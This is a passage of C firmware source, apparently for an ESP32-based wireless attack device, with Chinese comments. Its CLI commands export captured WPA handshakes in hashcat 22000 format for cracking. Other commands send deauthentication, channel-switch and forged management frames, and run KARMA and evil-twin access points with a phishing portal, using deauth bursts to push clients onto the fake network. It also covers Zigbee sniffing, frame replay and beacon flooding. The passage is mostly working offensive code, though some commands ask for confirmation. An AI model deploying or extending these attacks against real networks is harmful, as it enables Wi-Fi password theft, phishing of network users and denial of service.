        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "stop") == 0) {
        if (cap_stop() != ESP_OK) {
            printf("META,CAP,ERR,msg,not_running\n"); fflush(stdout);
            return 1;
        }
        printf("META,CAP,STOP,ok,1,frames,%u,drops,%u,bytes,%u,keys,%u\n",
               (unsigned)cap_frames(), (unsigned)cap_drops(),
               (unsigned)cap_pcap_size(), (unsigned)cap_key_count());
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "clear") == 0) {
        cap_clear();
        printf("META,CAP,CLEAR,ok,1\n"); fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "info") == 0) {
        printf("META,CAP,INFO,on,%d,keyonly,%d,frames,%u,drops,%u,bytes,%u,cap,%u,keys,%u,full,%d,seg,%d,segs,%d\n",
               cap_is_on() ? 1 : 0, cap_key_only() ? 1 : 0,
               (unsigned)cap_frames(), (unsigned)cap_drops(),
               (unsigned)cap_pcap_size(), (unsigned)cap_capacity(),
               (unsigned)cap_key_count(), cap_is_full() ? 1 : 0,
               cap_segment_index(), cap_segment_count());
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "keys") == 0) {
        uint32_t n = cap_key_count();
        printf("META,CAP,KEYCOUNT,n,%u\n", (unsigned)n);
        for (uint32_t i = 0; i < n; i++) {
            uint8_t kind = 0, chan = 0; uint32_t off = 0, len = 0, ts = 0; int8_t rssi = 0;
            if (cap_key_get(i, &kind, &off, &len, &ts, &chan, &rssi) != 0) continue;
            printf("META,CAP,KEY,i,%u,kind,%u,off,%u,len,%u,ts,%u,chan,%u,rssi,%d\n",
                   (unsigned)i, (unsigned)kind, (unsigned)off, (unsigned)len,
                   (unsigned)ts, (unsigned)chan, (int)rssi);
        }
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "hdr") == 0) {
        uint8_t h[CAP_PCAP_HDR];
        cap_pcap_header(h);
        ble_send_chunk(0, h, CAP_PCAP_HDR);
        printf("META,CAP,HDR,ok,1,size,%u\n", (unsigned)cap_pcap_size());
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "hex") == 0) {
        if (argc < 4) { printf("META,CAP,ERR,msg,need_off_len\n"); fflush(stdout); return 1; }
        uint32_t off = (uint32_t)strtoul(argv[2], NULL, 0);
        uint32_t len = (uint32_t)strtoul(argv[3], NULL, 0);
        if (len == 0 || len > 1024) len = 1024;
        uint8_t buf[256];
        uint32_t done = 0;
        while (done < len) {
            uint32_t n = len - done;
            if (n > sizeof(buf)) n = sizeof(buf);
            int got = cap_read(off + done, buf, n);
            if (got <= 0) break;
            for (int i = 0; i < got; i++) {
                printf("%02x", buf[i]);
                if (((done + (uint32_t)i + 1) % 32) == 0) printf("\n");
            }
            done += (uint32_t)got;
            if ((uint32_t)got < n) break;
        }
        if (done % 32) printf("\n");
        printf("META,CAP,HEX,off,%u,n,%u\n", (unsigned)off, (unsigned)done);
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "read") == 0) {
        if (argc < 4) { printf("META,CAP,ERR,msg,need_off_len\n"); fflush(stdout); return 1; }
        uint32_t off = (uint32_t)strtoul(argv[2], NULL, 0);
        uint32_t len = (uint32_t)strtoul(argv[3], NULL, 0);
        if (len == 0 || len > 2048) len = 2048;   /* 单片上限 2KB, 节奏由 App 的流控决定 */

        /* 2KB 读缓冲按需分配 (放 PSRAM), 不占静态内部 RAM */
        static uint8_t *s_rdbuf = NULL;
        if (!s_rdbuf) {
            s_rdbuf = heap_caps_malloc(2048, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
            if (!s_rdbuf) s_rdbuf = malloc(2048);
            if (!s_rdbuf) { printf("META,CAP,ERR,msg,no_mem\n"); fflush(stdout); return 1; }
        }
        int got = cap_read(off, s_rdbuf, len);
        if (got < 0) { printf("META,CAP,ERR,msg,read_failed\n"); fflush(stdout); return 1; }
        for (int i = 0; i < got; i += 200) {
            int n = got - i;
            if (n > 200) n = 200;
            ble_send_chunk(off + (uint32_t)i, s_rdbuf + i, n);
        }
        /* 收尾行在分片之后发出 (走 stdout 捕获通道), App 以此判定本次拉取结束 */
        printf("META,CAP,READ,off,%u,n,%d,size,%u\n",
               (unsigned)off, got, (unsigned)cap_pcap_size());
        fflush(stdout);
        return 0;
    }

    printf("META,CAP,ERR,msg,bad_subcmd (start|stop|clear|info|keys|read|hex|hdr)\n");
    fflush(stdout);
    return 1;
}

/* hs (EAPOL 握手归档 / hashcat 22000) */
static void hs_22000_sink(const char *line, void *ctx)
{
    (void)ctx;
    printf("%s\n", line);
    fflush(stdout);
}

static int cmd_hs(int argc, char **argv)
{
    const char *sub = (argc >= 2) ? argv[1] : "";

    if (argc >= 2 && strcmp(sub, "clear") == 0) {
        hs_clear();
        printf("META,HS,CLEAR,ok,1\n"); fflush(stdout);
        return 0;
    }
    if (argc >= 2 && strcmp(sub, "22000") == 0) {
        /* 行格式与 hashcat -m 22000 完全一致, App 直接存成 .hc22000 */
        printf("META,HS,22000,start,entries,%d\n", hs_complete_count());
        fflush(stdout);
        int n = hs_export_22000(hs_22000_sink, NULL);
        printf("META,HS,22000,done,lines,%d\n", n);
        fflush(stdout);
        if (n == 0) {
            printf("META,HS,22000,note,no_usable_handshake\n");
            fflush(stdout);
        }
        return 0;
    }

    if (argc >= 2 && strcmp(sub, "selftest") == 0) {
        int rc = hs_selftest();
        printf("META,HS,SELFTEST,result,%s\n", rc == 0 ? "pass" : "FAIL");
        fflush(stdout);
        return rc;
    }
    bool only = (argc >= 2 && strcmp(sub, "complete") == 0);
    int n = hs_dump(only);
    printf("META,HS,LIST,done,shown,%d,total,%d,complete,%d,pmkid,%d\n",
           n, hs_count(), hs_complete_count(), hs_pmkid_count());
    fflush(stdout);
    return 0;
}

/* RAW / KARMA / EVILTWIN (Stage 3) */

/* parse_mac() 已在 radio_common 里提供 (非 static), 这里直接复用 */

/* 按 BSSID 从 Wi-Fi 库里找 AP; 找到返回 true 并填充 ssid/ch */
static bool find_ap(const uint8_t bssid[6], char *ssid, size_t ssid_sz, uint8_t *ch)
{
    int n = 0;
    const ap_entry_t *aps = wifi_db_get_aps(&n);
    for (int i = 0; i < n; i++) {
        if (memcmp(aps[i].bssid, bssid, 6) != 0) continue;
        snprintf(ssid, ssid_sz, "%s", aps[i].ssid);
        if (ch) *ch = aps[i].channel;
        return true;
    }
    return false;
}

static int cmd_raw(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  raw tx <hex>                    原样发送 (空格/冒号/连写均可)\n"
               "  raw deauth <bssid> [sta]        构造 Deauth (默认广播, 原因码 7)\n"
               "  raw auth <bssid> [sta]          构造 Auth (开放系统, seq 1)\n"
               "  raw assoc <bssid> <ssid> [ch]   构造 Assoc Request\n"
               "  raw beacon <ssid> [ch]          发一个 Beacon\n"
               "  raw proberesp <ssid> [ch] [dst] 发一个 Probe Response\n");
        return 1;
    }
    const char *sub = argv[1];
    uint8_t f[600];
    int len = 0;
    uint8_t bssid[6], sta[6];
    static const uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    if (strcmp(sub, "tx") == 0) {
        if (argc < 3) { printf("META,RAW,ERR,msg,need_hex\n"); fflush(stdout); return 1; }
        /* 允许把 hex 分成多个参数写, 拼接后再解析 */
        char hex[1200] = {0};
        for (int i = 2; i < argc; i++) {
            if (i > 2) strncat(hex, " ", sizeof(hex) - strlen(hex) - 1);
            strncat(hex, argv[i], sizeof(hex) - strlen(hex) - 1);
        }
        esp_err_t e = fb_tx_hex(hex, &len);
        if (e != ESP_OK) {
            /* 以前失败也走 META,RAW,TX,ok,0: Tag 是成功态, 只有 ok 字段是 0.
             * 任何按 Tag 或按 ok 字段判断的调用方都会把它读成成功.
             * 失败必须走 ERR Tag; 同时保留 ok,0 与 err 字段, 兼容旧解析. */
            printf("META,RAW,ERR,sub,tx,ok,0,len,%d,code,%d,err,%s\n",
                   len, e, esp_err_to_name(e));
            fflush(stdout);
            return 1;
        }
        printf("META,RAW,TX,ok,1,len,%d\n", len);
        fflush(stdout);
        return 0;
    }

    if (strcmp(sub, "deauth") == 0) {
        if (argc < 3 || !parse_mac(argv[2], bssid)) {
            printf("META,RAW,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
        }
        const uint8_t *dst = bc;
        if (argc >= 4 && parse_mac(argv[3], sta)) dst = sta;
        len = fb_deauth(f, sizeof(f), bssid, dst, 7);
    } else if (strcmp(sub, "auth") == 0) {
        if (argc < 3 || !parse_mac(argv[2], bssid)) {
            printf("META,RAW,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
        }
        uint8_t src[6];
        if (argc >= 4 && parse_mac(argv[3], sta)) memcpy(src, sta, 6);
        else fb_random_local_mac(src);
        len = fb_auth(f, sizeof(f), bssid, src, 1, 0);
    } else if (strcmp(sub, "assoc") == 0) {
        if (argc < 4 || !parse_mac(argv[2], bssid)) {
            printf("META,RAW,ERR,msg,usage_raw_assoc_bssid_ssid\n"); fflush(stdout); return 1;
        }
        const char *ssid = argv[3];
        uint8_t ch = (argc >= 5) ? (uint8_t)atoi(argv[4]) : 6;
        uint8_t src[6]; fb_random_local_mac(src);
        len = fb_assoc_req(f, sizeof(f), bssid, src, (const uint8_t *)ssid, (int)strlen(ssid), ch);
    } else if (strcmp(sub, "beacon") == 0) {
        if (argc < 3) { printf("META,RAW,ERR,msg,need_ssid\n"); fflush(stdout); return 1; }
        uint8_t ch = (argc >= 4) ? (uint8_t)atoi(argv[3]) : 6;
        uint8_t src[6]; fb_random_local_mac(src);
        len = fb_beacon(f, sizeof(f), src, (const uint8_t *)argv[2], (int)strlen(argv[2]), ch);
    } else if (strcmp(sub, "proberesp") == 0) {
        if (argc < 3) { printf("META,RAW,ERR,msg,need_ssid\n"); fflush(stdout); return 1; }
        uint8_t ch = (argc >= 4) ? (uint8_t)atoi(argv[3]) : 6;
        const uint8_t *dst = bc;
        if (argc >= 5 && parse_mac(argv[4], sta)) dst = sta;
        uint8_t src[6]; fb_random_local_mac(src);
        len = fb_probe_resp(f, sizeof(f), dst, src, (const uint8_t *)argv[2], (int)strlen(argv[2]), ch);
    } else if (strcmp(sub, "csa") == 0) {
        if (argc < 4) {
            printf("META,CSA,ERR,msg,need_args (raw csa <bssid> <new_ch> [count] "
                   "[--ssid X] [--ch N] [--dry] [--yes])\n");
            fflush(stdout);
            return 1;
        }
        uint8_t bssid[6];
        if (!parse_mac(argv[2], bssid)) {
            printf("META,CSA,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
        }
        int new_ch = atoi(argv[3]);
        if (!((new_ch >= 1 && new_ch <= 14) || (new_ch >= 36 && new_ch <= 177))) {
            printf("META,CSA,ERR,msg,bad_channel\n"); fflush(stdout); return 1;
        }
        int count = (argc >= 5 && argv[4][0] != '-') ? atoi(argv[4]) : 3;
        if (count < 1) count = 1;
        if (count > 10) count = 10;

        const char *ssid = NULL;
        char ssidbuf[33] = {0};
        int ch = 0;
        bool dry = false;
        for (int i = 4; i < argc; i++) {
            if (strcmp(argv[i], "--dry") == 0) dry = true;
            else if (strcmp(argv[i], "--ssid") == 0 && i + 1 < argc) ssid = argv[++i];
            else if (strcmp(argv[i], "--ch") == 0 && i + 1 < argc) ch = atoi(argv[++i]);
        }

        /* 库里有这个 BSSID 就用它的信道与 SSID, 并且能从空口抓到真 beacon 来改;
         * 库里没有就退到合成, 这时必须给 --ssid. */
        const ap_entry_t *ap = wifi_db_find_ap(bssid);
        if (ap) {
            if (!ssid) { snprintf(ssidbuf, sizeof(ssidbuf), "%s", ap->ssid); ssid = ssidbuf; }
            if (!ch) ch = ap->channel;
        }
        if (!ch) ch = 6;

        if (!dry && !confirm_dangerous(argc, argv, "raw csa")) return 1;

        static csa_result_t res;
        esp_err_t e = wifi_attack_csa(bssid, ssid, (uint8_t)ch, (uint8_t)new_ch,
                                      (uint8_t)count, dry, &res);
        if (e != ESP_OK) {
            printf("META,CSA,ERR,msg,csa_failed,code,%d\n", (int)e);
            fflush(stdout);
            return 1;
        }
        char bs[18];
        mac_to_str(bssid, bs);
        if (dry) {
            printf("META,CSA,HEX,len,%d,data,", res.len);
            for (int i = 0; i < res.len; i++) printf("%02x", res.bytes[i]);
            printf("\n");
            printf("META,CSA,DRY,ok,1,bssid,%s,from,%d,to,%d,cloned,%d,len,%d\n",
                   bs, ch, new_ch, res.cloned ? 1 : 0, res.len);
        } else {
            printf("META,CSA,TX,ok,%d,bssid,%s,from,%d,to,%d,sent,%d,fail,%d,cloned,%d\n",
                   res.sent > 0 ? 1 : 0, bs, ch, new_ch, res.sent, res.fail,
                   res.cloned ? 1 : 0);
        }
        fflush(stdout);
        return (res.sent > 0 || dry) ? 0 : 1;
    } else {
        printf("META,RAW,ERR,msg,bad_subcmd (tx|deauth|auth|assoc|beacon|proberesp|csa)\n");
        fflush(stdout);
        return 1;
    }

    if (len <= 0) { printf("META,RAW,ERR,msg,build_failed\n"); fflush(stdout); return 1; }
    esp_err_t e = fb_tx(f, len);
    if (e != ESP_OK) {
        printf("META,RAW,ERR,sub,%s,ok,0,len,%d,code,%d,err,%s\n",
               sub, len, e, esp_err_to_name(e));
        fflush(stdout);
        return 1;
    }
    printf("META,RAW,SEND,sub,%s,len,%d,ok,1\n", sub, len);
    fflush(stdout);
    return 0;
}

/* karma (Probe Request SSID 收集) */
static int cmd_karma(int argc, char **argv)
{
    const char *sub = (argc >= 2) ? argv[1] : "";

    if (strcmp(sub, "clear") == 0) {
        karma_clear();
        printf("META,KARMA,CLEAR,ok,1\n"); fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "follow") == 0) {
        int n = (argc >= 3) ? atoi(argv[2]) : 0;
        int cnt = 0;
        const char *ssid = karma_get(n, &cnt, NULL);
        if (!ssid || !*ssid) {
            printf("META,KARMA,ERR,msg,no_ssid (先嗅探收集 Probe Request)\n");
            fflush(stdout);
            return 1;
        }
        /* 门户改名成客户端正在找的 SSID, 它会自动连过来 */
        phish_stop();
        http_server_set_clone(0, NULL);
        esp_err_t e = phish_start(ssid, "");
        if (e != ESP_OK) {
            printf("META,KARMA,ERR,ssid,%s,ok,0,code,%d,err,%s\n",
                   ssid, e, esp_err_to_name(e));
            fflush(stdout);
            return 1;
        }
        printf("META,KARMA,FOLLOW,ssid,%s,count,%d,ok,1\n", ssid, cnt);
        fflush(stdout);
        return 0;
    }

    /* 默认列出 */
    int total = karma_count();
    printf("META,KARMA,LIST,count,%d\n", total);
    for (int i = 0; i < total; i++) {
        int cnt = 0; int8_t r = 0;
        const char *s = karma_get(i, &cnt, &r);
        if (!s) break;
        printf("KARMA,%d,%s,hits,%d,rssi,%d\n", i, s, cnt, (int)r);
    }
    fflush(stdout);
    return 0;
}

/* eviltwin (克隆目标 AP) */

typedef struct { uint8_t bssid[6]; int bursts; } ev_push_t;

static void ev_push_task(void *pv)
{
    ev_push_t *a = (ev_push_t *)pv;
    static const uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t f[64];
    for (int i = 0; i < a->bursts; i++) {
        int len = fb_deauth(f, sizeof(f), a->bssid, bc, 7);
        if (len > 0) fb_tx(f, len);
        vTaskDelay(pdMS_TO_TICKS(150));
    }
    printf("META,EVILTWIN,PUSH,done,bursts,%d\n", a->bursts);
    fflush(stdout);
    free(a);
    vTaskDelete(NULL);
}

static int cmd_eviltwin(int argc, char **argv)
{
    const char *sub = (argc >= 2) ? argv[1] : "";

    if (strcmp(sub, "stop") == 0) {
        phish_stop();
        http_server_set_clone(0, NULL);
        printf("META,EVILTWIN,STOP,ok,1\n"); fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "clone") != 0) {
        printf("usage:\n"
               "  eviltwin clone <bssid> [push]   克隆该 AP 的 SSID+BSSID+信道并开门户\n"
               "                                  push = 顺带发一轮 Deauth 把客户端赶过来\n"
               "  eviltwin stop\n");
        return 1;
    }
    if (!confirm_dangerous(argc, argv, "clone <bssid>")) return 1;
    uint8_t bssid[6];
    if (argc < 3 || !parse_mac(argv[2], bssid)) {
        printf("META,EVILTWIN,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
    }
    char ssid[33] = {0};
    uint8_t ch = 0;
    if (!find_ap(bssid, ssid, sizeof(ssid), &ch)) {
        printf("META,EVILTWIN,ERR,msg,ap_not_found (先 scan/sniff 把它抓进库里)\n");
        fflush(stdout);
        return 1;
    }
    if (!ssid[0] || strcmp(ssid, "<hidden>") == 0) {
        printf("META,EVILTWIN,ERR,msg,ssid_hidden 无法克隆隐藏 SSID\n");
        fflush(stdout);
        return 1;
    }

    /* 单射频: 起 AP 就不能同时嗅探, 先停掉所有作业 */
    wifi_attack_stop_all();
    phish_stop();
    http_server_set_clone(ch, bssid);
    /* 空口令 -> 开放网络, 客户端无需口令即可连上 (见 http_server.c 的 authmode) */
    esp_err_t e = phish_start(ssid, "");
    if (e != ESP_OK) {
        printf("META,EVILTWIN,ERR,ssid,%s,bssid,%02x:%02x:%02x:%02x:%02x:%02x,"
               "ok,0,code,%d,err,%s\n",
               ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
               e, esp_err_to_name(e));
        fflush(stdout);
        return 1;
    }
    printf("META,EVILTWIN,CLONE,ssid,%s,bssid,%02x:%02x:%02x:%02x:%02x:%02x,"
           "chan,%u,ok,1\n",
           ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
           (unsigned)ch);
    fflush(stdout);

    if (argc >= 4 && strcmp(argv[3], "push") == 0) {
        ev_push_t *a = calloc(1, sizeof(ev_push_t));
        if (a) {
            memcpy(a->bssid, bssid, 6);
            a->bursts = 20;
            if (xTaskCreate(ev_push_task, "ev_push", 3072, a, 5, NULL) != pdPASS) {
                free(a);
                printf("META,EVILTWIN,PUSH,err,task_create\n"); fflush(stdout);
            }
        }
    }
    return 0;      /* 失败分支已在上面早退 */
}

/* blescan (板子侧 BLE 近邻扫描) */
static int cmd_blescan(int argc, char **argv)
{
    const char *sub = (argc >= 2) ? argv[1] : "";

    if (strcmp(sub, "start") == 0) {
        ble_scan_clear();
        /* 单射频: NUS 广播正在跑时 ble_gap_disc() 会被控制器拒 (EBUSY),
         * 用户侧只看到 ok,0 / on,0, 表永远是空的. 先挂起广播再扫,
         * 扫完由 ble_cli_adv_resume() 恢复. */
        bool was_adv = ble_cli_adv_suspend();
        esp_err_t e = ble_scan_start();
        if (e != ESP_OK) {
            if (was_adv) ble_cli_adv_resume();
            printf("META,BLESCAN,ERR,sub,start,ok,0,found,%d,code,%d,err,%s\n",
                   ble_scan_count(), e, esp_err_to_name(e));
            fflush(stdout);
            return 1;
        }
        printf("META,BLESCAN,START,ok,1,found,%d\n", ble_scan_count());
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "stop") == 0) {
        esp_err_t e = ble_scan_stop();
        ble_cli_adv_resume();     /* 恢复 NUS 广播 */
        if (e != ESP_OK) {
            printf("META,BLESCAN,ERR,sub,stop,ok,0,found,%d,code,%d,err,%s\n",
                   ble_scan_count(), e, esp_err_to_name(e));
            fflush(stdout);
            return 1;
        }
        printf("META,BLESCAN,STOP,ok,1,found,%d\n", ble_scan_count());
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "clear") == 0) {
        ble_scan_clear();
        printf("META,BLESCAN,CLEAR,ok,1\n"); fflush(stdout);
        return 0;
    }

    int n = ble_scan_count();
    printf("META,BLESCAN,LIST,count,%d,on,%d\n", n, ble_scan_is_on() ? 1 : 0);
    for (int i = 0; i < n; i++) {
        uint8_t a[6]; int8_t r = 0; const char *nm = NULL;
        if (!ble_scan_get(i, a, &r, &nm)) break;
        /* NimBLE 的地址是小端存储, 显示要反过来才是习惯写法 */
        printf("BLEDEV,%02x:%02x:%02x:%02x:%02x:%02x,rssi,%d,name,%s\n",
               a[5], a[4], a[3], a[2], a[1], a[0], (int)r,
               (nm && *nm) ? nm : "-");
    }
    fflush(stdout);
    return 0;
}

/* zbsniff: 802.15.4 / Zigbee / Thread 嗅探 */
static int cmd_zbsniff(int argc, char **argv)
{
    if (argc >= 2 && strcmp(argv[1], "stop") == 0) {
        esp_err_t e = zbsniff_stop();
        /* 失败走 ERR Tag. 以前 STOP Tag 配 err,259, 按 Tag 判断的调用方
         * 会把它读成一次成功的停止. */
        if (e != ESP_OK) printf("META,ZB,ERR,msg,not_running\n");
        else            printf("META,ZB,STOP,err,0\n");
        fflush(stdout);
        return e == ESP_OK ? 0 : 1;
    }
    if (argc >= 2 && strcmp(argv[1], "status") == 0) { zbsniff_status(); return 0; }
    if (argc >= 2 && strcmp(argv[1], "clear") == 0) {
        zbsniff_clear();
        printf("META,ZB,CLEAR,ok\n"); fflush(stdout);
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "dump") == 0) {
        int n = zbsniff_count();
        printf("META,ZB,DUMP,count,%d\n", n);
        uint8_t buf[ZB_FRAME_MAX + 1];
        for (int i = 0; i < n; i++) {
            int8_t rssi; uint8_t lqi, ch; uint64_t ts;
            int len = zbsniff_get(i, buf, sizeof(buf), &rssi, &lqi, &ch, &ts);
            if (len <= 0) continue;
            printf("ZB,%d,len,%d,rssi,%d,lqi,%u,ch,%u,hex,", i, len, rssi, lqi, ch);
            for (int k = 0; k < len; k++) printf("%02x", buf[k]);
            printf("\n");
        }
        fflush(stdout);
        return 0;
    }
    if (argc >= 2) {
        int ch = atoi(argv[1]);
        if (ch < ZB_CH_MIN || ch > ZB_CH_MAX) {
            printf("META,ZB,ERR,msg,bad_channel (11-26)\n"); fflush(stdout); return 1;
        }
        /* 802.15.4 与 Wi-Fi 分时共存同一射频: 先停掉所有 Wi-Fi 作业 */
        wifi_attack_stop_all();
        /* 换信道: 原实现在跑时直接回 INVALID_STATE, 扫全信道时必须先 stop.
         * 这里自动停掉再开, 与 sniff <ch> 的行为一致. */
        if (zbsniff_is_on()) zbsniff_stop();
        esp_err_t e = zbsniff_start((uint8_t)ch);
        if (e != ESP_OK) {
            printf("META,ZB,ERR,code,%d,msg,start_failed\n", (int)e); fflush(stdout); return 1;
        }
        printf("META,ZB,START,channel,%d\n", ch); fflush(stdout);
        return 0;
    }
    printf("usage: zbsniff <ch 11-26> | stop | status | dump | clear\n");
    fflush(stdout);
    return 1;
}

/* 802.15.4 hex 解析: 允许空格/冒号/连写, 与 fb_tx_hex 同口径 */
static int zbtx_parse_hex(const char *hex, uint8_t *out, int cap)
{
    int n = 0;
    int hi = -1;
    for (const char *p = hex; *p; p++) {
        char c = *p;
        int v;
        if (c >= '0' && c <= '9')      v = c - '0';
        else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') v = c - 'A' + 10;
        else continue;                      /* 跳过分隔符 */
        if (hi < 0) hi = v;
        else {
            if (n >= cap) return -1;
            out[n++] = (uint8_t)((hi << 4) | v);
            hi = -1;
        }
    }
    if (hi >= 0) return -1;                 /* 半个字节 */
    return n;
}

/* zbtx: 802.15.4 发送 (beacon / beacon request / 重放 / 洪泛) */
static int cmd_zbtx(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  zbtx beacon <ch> [pan] [n]      Zigbee 协调器 beacon (默认 1 个)\n"
               "  zbtx beaconreq <ch> [pan] [ms]  Beacon Request 后监听回应\n"
               "  zbtx data <ch> <dst_pan> <dst> <src> <hex>  单播数据帧\n"
               "  zbtx raw <hex> [n]              原样发送 (帧自带长度前缀)\n"
               "  zbtx replay <i> [n]             重放 zbsniff 表里第 i 条\n"
               "  zbtx flood <ch> [pan] [n]       beacon 洪泛 (默认 100)\n"
               "  [--dry 只组帧] [--noca 跳过 CCA] [--n N]\n"
               "  zbtx stop | stats\n");
        fflush(stdout);
        return 1;
    }
    const char *sub = argv[1];

    if (strcmp(sub, "stop") == 0) {
        if (zbtx_flood_on()) zbtx_flood_stop();
        esp_err_t e = zbtx_stop();
        /* 同 zbsniff: 失败走 ERR Tag, 不用 STOP 配 err 码 */
        if (e != ESP_OK) printf("META,ZB,TX,ERR,msg,not_running\n");
        else            printf("META,ZB,TX,STOP,err,0\n");
        fflush(stdout);
        return e == ESP_OK ? 0 : 1;
    }
    if (strcmp(sub, "stats") == 0) { zbtx_status(); return 0; }

    bool dry = false, yes = g_yes, noca = false;
    int rep = 1;
    /* 扫 --dry / --yes / --noca / --n N */
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--dry") == 0) dry = true;
        else if (strcmp(argv[i], "--yes") == 0) yes = true;
        /* CCA 是能量检测, 802.15.4 ch11-26 与 Wi-Fi ch1-13 频率重叠,
         * 现场有 23 台 AP 时几乎每个窗口都是忙的, 实测 10 帧只有 1 帧发出去.
         * --noca 跳过空闲评估直接发. */
        else if (strcmp(argv[i], "--noca") == 0) noca = true;
        else if (strcmp(argv[i], "--n") == 0 && i + 1 < argc) rep = atoi(argv[++i]);
    }

    uint8_t frame[ZBTX_FRAME_MAX + 2];
    int n = 0;

    if (strcmp(sub, "beacon") == 0) {
        if (argc < 3) { printf("META,ZB,TX,ERR,msg,need_channel\n"); fflush(stdout); return 1; }
        int ch = atoi(argv[2]);
        if (ch < ZB_CH_MIN || ch > ZB_CH_MAX) {
            printf("META,ZB,TX,ERR,msg,bad_channel (11-26)\n"); fflush(stdout); return 1;
        }
        uint16_t pan = (argc >= 4) ? (uint16_t)strtol(argv[3], NULL, 0) : 0;
        if (argc >= 5 && rep == 1) rep = atoi(argv[4]);
        if (rep < 1) rep = 1;
        if (rep > 500) rep = 500;
        n = zbtx_build_beacon(frame, sizeof(frame), pan, (uint8_t)ch, 0x2a);
    } else if (strcmp(sub, "beaconreq") == 0) {
        if (argc < 3) { printf("META,ZB,TX,ERR,msg,need_channel\n"); fflush(stdout); return 1; }
        int ch = atoi(argv[2]);
        if (ch < ZB_CH_MIN || ch > ZB_CH_MAX) {
            printf("META,ZB,TX,ERR,msg,bad_channel (11-26)\n"); fflush(stdout); return 1;
        }
        n = zbtx_build_beacon_req(frame, sizeof(frame), 0, 0x5c);
    } else if (strcmp(sub, "data") == 0) {
        if (argc < 7) {
            printf("usage: zbtx data <ch> <dst_pan> <dst> <src> <hex>\n");
            fflush(stdout); return 1;
        }
        int ch = atoi(argv[2]);
        if (ch < ZB_CH_MIN || ch > ZB_CH_MAX) {
            printf("META,ZB,TX,ERR,msg,bad_channel (11-26)\n"); fflush(stdout); return 1;
        }
        uint16_t dp = (uint16_t)strtol(argv[3], NULL, 0);
        uint16_t d  = (uint16_t)strtol(argv[4], NULL, 0);
        uint16_t s  = (uint16_t)strtol(argv[5], NULL, 0);
        uint8_t pay[ZBTX_FRAME_MAX];
        int pl = zbtx_parse_hex(argv[6], pay, sizeof(pay));
        if (pl < 0) { printf("META,ZB,TX,ERR,msg,bad_payload_hex\n"); fflush(stdout); return 1; }
        n = zbtx_build_data(frame, sizeof(frame), dp, d, dp, s, pay, pl, 0x7e);
    } else if (strcmp(sub, "raw") == 0) {
        if (argc < 3) { printf("META,ZB,TX,ERR,msg,need_hex\n"); fflush(stdout); return 1; }
        /* 只拼 hex 段. 后面的 --dry / --yes / --n 必须排除: 'd' 本身是合法
         * hex 数字, 拼进去会多出半个字节, 整帧被判成长度不符. */
        char hex[1200] = {0};
        for (int i = 2; i < argc; i++) {
            if (argv[i][0] == '-' && argv[i][1] == '-') break;
            if (hex[0]) strncat(hex, " ", sizeof(hex) - strlen(hex) - 1);
            strncat(hex, argv[i], sizeof(hex) - strlen(hex) - 1);
        }
        if (!hex[0]) { printf("META,ZB,TX,ERR,msg,need_hex\n"); fflush(stdout); return 1; }
        n = zbtx_parse_hex(hex, frame, sizeof(frame));
        if (n <= 0 || frame[0] == 0 || frame[0] >= n) {
            printf("META,ZB,TX,ERR,msg,bad_frame (首字节须为 MHR+payload 长度)\n");
            fflush(stdout); return 1;
        }
    } else if (strcmp(sub, "replay") == 0) {
        if (argc < 3) { printf("META,ZB,TX,ERR,msg,need_index\n"); fflush(stdout); return 1; }
        int idx = atoi(argv[2]);
        int8_t rssi; uint8_t lqi, ch; uint64_t ts;
        n = zbsniff_get(idx, frame, sizeof(frame), &rssi, &lqi, &ch, &ts);
        if (n <= 0) { printf("META,ZB,TX,ERR,msg,no_such_entry\n"); fflush(stdout); return 1; }
    } else if (strcmp(sub, "flood") == 0) {
        if (argc < 3) { printf("META,ZB,TX,ERR,msg,need_channel\n"); fflush(stdout); return 1; }
        int ch = atoi(argv[2]);
        if (ch < ZB_CH_MIN || ch > ZB_CH_MAX) {
            printf("META,ZB,TX,ERR,msg,bad_channel (11-26)\n"); fflush(stdout); return 1;
        }
        uint16_t pan = (argc >= 4) ? (uint16_t)strtol(argv[3], NULL, 0) : 0;
        int cnt = (argc >= 5 && rep == 1) ? atoi(argv[4]) : 100;
        if (cnt < 1) cnt = 1;
        if (cnt > 100000) cnt = 100000;
        if (dry) {
            n = zbtx_build_beacon(frame, sizeof(frame), pan, (uint8_t)ch, 0x2a);
        } else {
            if (!yes && !confirm_dangerous(argc, argv, "<ch> [pan] [n]")) return 1;
            wifi_attack_stop_all();
            esp_err_t e = zbtx_flood_start((uint8_t)ch, pan, cnt, !noca);
            if (e != ESP_OK) {
                printf("META,ZB,TX,ERR,code,%d,msg,flood_start_failed\n", (int)e);
                fflush(stdout); return 1;
            }
            printf("META,ZB,TX,FLOOD,ch,%d,pan,%u,n,%d\n", ch, (unsigned)pan, cnt);
            fflush(stdout);
            return 0;
        }
    } else {
        printf("META,ZB,TX,ERR,msg,bad_subcmd (beacon|beaconreq|data|raw|replay|flood|stop|stats)\n");
        fflush(stdout);
        return 1;
    }

    if (n <= 0) {
        printf("META,ZB,TX,ERR,msg,build_failed\n");
        fflush(stdout);
        return 1;
    }

    if (dry) {
